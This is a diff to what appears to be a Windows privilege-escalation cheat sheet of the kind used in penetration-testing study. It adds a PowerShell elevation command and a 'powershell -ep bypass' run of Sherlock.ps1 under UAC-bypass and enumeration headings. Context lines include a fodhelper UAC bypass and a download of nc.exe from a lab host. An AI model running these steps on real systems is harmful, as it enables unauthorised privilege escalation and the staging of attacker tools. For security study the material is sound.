@@ -1521,6 +1521,11 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ## UAC Bypass
 Check integrity level with ``whoami /groups`` or ``whoami /all``
 
+### Simply using Powershell
+```
+powershell.exe Start-Process cmd.exe -Verb runAs
+```
+
 The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
 1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
 ```
@@ -1582,6 +1587,11 @@ IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.ex
 ### PowerShell
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
 * [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
+```
+powershell -ep bypass
+Import-Module .\Sherlock.ps1
+Find-AllVulns
+```
 * [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 * [jaws-enum.ps1](https://github.com/411Hall/JAWS)
 
